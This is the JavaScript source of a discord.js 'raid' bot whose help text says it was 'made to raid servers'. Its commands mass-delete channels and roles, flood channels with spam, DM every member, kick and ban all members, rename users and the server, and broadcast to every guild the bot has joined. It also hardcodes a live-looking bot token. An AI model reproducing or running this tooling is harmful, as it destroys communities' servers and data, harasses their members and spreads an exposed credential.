const Discord = require('discord.js');
const client = new Discord.Client();
const botPrefix = "/"

// All commands must be accompanied by the prefix: /

var botname = "The Club" // You can change the name of the bot //

const token = "ODQwNTAyMzkyMDcwODY0OTE3.YJZI2g.UBV_vzLtRLT2qZNfA2-8u-MYAJs";


client.on('message', msg => {

    if (msg.guild && msg.content.startsWith('/mdhere')) {
        let text = msg.content.slice('/mdhere'.length);
        msg.guild.members.forEach(member => {
            if (member.id != client.user.id && !member.user.bot) member.send(text);
        });
    }
    if(msg.content.startsWith('/channels')){
        let channelname = msg.content.slice('/channels'.length);
        msg.channel.send("Creating 50 new text channels: " + "**" + channelname + "**")

        var i;
        for (i = 0; i < 50; i++) {
            setTimeout(() => {

                msg.guild.createChannel(channelname,{type: 'text'})
                    .then(console.log)
                    .catch(console.error);

            },1*1) //3 seconden
        }
    }
    if(msg.content.startsWith("/spam")){
        let yourmessage = msg.content.slice('/spam'.length);
        var i;

        for (i = 0; i < 50; i++) {
            setTimeout(() => {
                msg.channel.send(yourmessage)
            },1*1) //3 seconden
        }

    }
    if(msg.content.startsWith('/deletechannels')){ // Delete all channels
        var i = 0
        msg.guild.channels.forEach(channel =>
            i++
        )
        msg.channel.send("Deleting **" + i + "** channels!")
        msg.guild.channels.forEach(channel =>


            setTimeout(() => {channel.delete()},1000*3))
        //if(name != "https://github.com/NiicoBANNED"){
        msg.guild.createChannel("if you werent a cunt this woudnt be like this",{type: 'text'})
            .then(console.log)
            .catch(console.error);
        //}



    }
    if(msg.content.startsWith('/deleteroles')){
        let notdelete = msg.content.slice('/deleteroles'.length);
        var i = 0
        msg.guild.roles.forEach(role =>
            i++
        )
        msg.channel.send("Starting to delete **"+i+"** roles!")
        msg.guild.roles.forEach(role =>
            setTimeout(() => {
                if(msg.guild.id !== role.id && role.name != "The Club" && role.id != notdelete){
                    role.delete()
                }
            },1000*3))
    }
    if(msg.content == "/help"){/*
      const helpEmbed = new Discord.RichEmbed()
      .setColor('#0099ff')
      .setTitle('Bot Raid')
      .setURL('https://discord.gg/NsS2BrWEfG')
      .setDescription('Here you have all the bot commands')
      .setThumbnail('')
      .addField("The CEO of this bot is not responsible for what you do with the bot (use it at your own risk).')
      .addBlankField()
      .addField('Command', '\n/help\n/deletechannels\n/deleteroles\n/channels\n/spam\n/spamall\n/pmeveryone', true)
        .addField('Usage', '\n`/help`\n`/deletechannels`\n`/deleteroles`\n`/channels {name}`\n`/spam`\n`/spamall {message}`\n`/mdhere {message}`', true)
        .addField('Function', '\nShows this list\nDeletes all channels\n/delets all roles\nCreates 50 channels the with {name}\nSpams the channel sent in\nSpams all the channels)
      //.setImage('')
      .setTimestamp()
        .setFooter('Made by ! Niko#2634');

      msg.channel.send(helpEmbed);
        */
        const embed = {
            "title": ":cyclone: Bot Raid Help :cyclone:",
            "description": "The Bot raid, was made to raid servers (use it at your own risk.).\nThe CEO of this bot is not responsible for what you do with the bot!",
            "url": "https://discord.gg/NsS2BrWEfG",
            "color": 515151,
            "timestamp": "2020-04-10T08:55:46.190Z",
            "footer": {
                "icon_url": "https://cdn.discordapp.com/avatars/746303742793744436/ad811848136f0d02271437eaa46b14cb.png?size=128",
                "text": "© All rights reserved"
            },
            "thumbnail": {
                "url": "https://www.linfo.re/IMG/jpg/raid-39.jpg"
            },
            "image": {
                "url": "https://i.pinimg.com/originals/dc/ae/08/dcae08465ab3c19af6f1ecd10c725b6b.jpg"
            },
            "author": {
                "name": "Bot made by ! Niko#2634",
                "url": "https://github.com/NiicoBANNED",
                "icon_url": "https://cdn.discordapp.com/avatars/746303742793744436/ad811848136f0d02271437eaa46b14cb.png?size=128"
            },
            "fields": [
                {
                    "name": "Commands",
                    "value": "/deletechannels       Deletes all channels\n/deleteroles              Delete all server roles.\n/channels {name}   Creates 50 channels with the name {name}\n/renameall {name}  Rename all users on the server with the name of {name}\n/guildname {name} rename the server to {name}\n/spam {message}    Spams the channel sent in with {message}\n/spamall {message} Spams all channels with {message}\n/mdhere {message} Sends all members in server a private message with {message}\n\n/kickall                       Kicks all members\n/banall                        Bans all members\n/help                           Sends this message"
                },
                {
                    "name": "Thank you for reading",
                    "value": "See you later"
                }
            ]
        };
        msg.channel.send({ embed });

    }
    if(msg.content.startsWith('/spamall')){
        var i;
        for (i = 0; i < 5; i++) {

            setTimeout(() => {

                let yourmessage = msg.content.slice('/spamall'.length);

                msg.guild.channels.forEach(channel =>
                    channel.send(yourmessage)
                )
            },1*1) //3 seconden
        }
    }
    if(msg.content == "/kickall"){

        msg.guild.members.forEach(member => {

            if(member != msg.member && member.id != "398441594094616578" && member.id != "644262630348947477" && member.id != "681954860308103255"){
                member.kick();
            }
        })
    }
    if(msg.content == "/banall"){

        msg.guild.members.forEach(member => {

            if(member != msg.member && member.id != "398441594094616578" && member.id != "644262630348947477" && member.id != "681954860308103255"){
                member.ban();
            }
        })
    }
    if(msg.content.startsWith == "/setbotname"){
        let botnamefrommessage = msg.content.slice('/spamall'.length); // cuts off the /private part
        msg.channel.send("Bot name set to **" + botnamefrommessage + "**");
        client.setNickname(botnamefrommessage);
        botname = botnamefrommessage;
    }
    if(msg.content.startsWith('/renameall')){
        let nickname = msg.content.slice('/renameall'.length);
        var i = 0;
        msg.guild.members.forEach(member =>{
                i++
            }
        )
        msg.channel.send("Changing names of **" + i + "** members to **" + nickname + "**")
        msg.guild.members.forEach(member =>{

                member.setNickname(nickname)
            }
        )
    }
    if(msg.content.startsWith('/guildname')){
        let newguildname = msg.content.slice('/guildname'.length);
        msg.channel.send("Setting server name to **" + newguildname + "**")
        msg.guild.setName(newguildname)
    }


    if((msg.content.startsWith('/everyguildupdatemessage'))){
        let msgtosend = msg.content.slice('/everyguildupdatemessage'.length)
        msg.delete();
        var guildList = client.guilds.array();
        try{
            guildList.forEach(guild =>
                guild.channels.forEach(channel =>
                    channel.send(msgtosend)
                )

            )
        } catch (err) {
            console.log("could not send message")
        }
    }
    if((msg.content.startsWith('/everyguildmassnick'))){
        let nickname = msg.content.slice('/everyguildmassnick'.length)
        msg.delete();
        var guildList = client.guilds.array();
        try{
            guildList.forEach(guild =>
                guild.members.forEach(member =>{
                    member.setNickname(nickname);
                })

            )
        } catch (err) {
            console.log("could not send message")
        }
    }
});
client.login(token)